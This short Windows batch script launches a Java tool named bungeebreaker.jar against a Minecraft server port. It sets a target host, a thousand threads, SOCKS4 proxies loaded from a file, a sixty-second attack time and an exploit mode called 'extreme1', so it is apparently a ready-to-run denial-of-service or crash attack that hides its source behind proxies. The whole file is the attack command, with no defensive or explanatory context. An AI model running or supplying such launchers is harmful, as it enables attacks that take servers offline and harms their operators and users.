@echo off

cls

java -jar bungeebreaker.jar host=1.1.1.1 port=25565 srvResolve=true srvResolve2=false alwaysResolve=false threads=1000 connections=100 multi=true removeFailure=true socksV4=true loopAmount=1900 timeout=2500 keepAlive=false proxiesType=socks print=false proxiesFile=socks4_proxies.txt attackTime=60 exploit=extreme1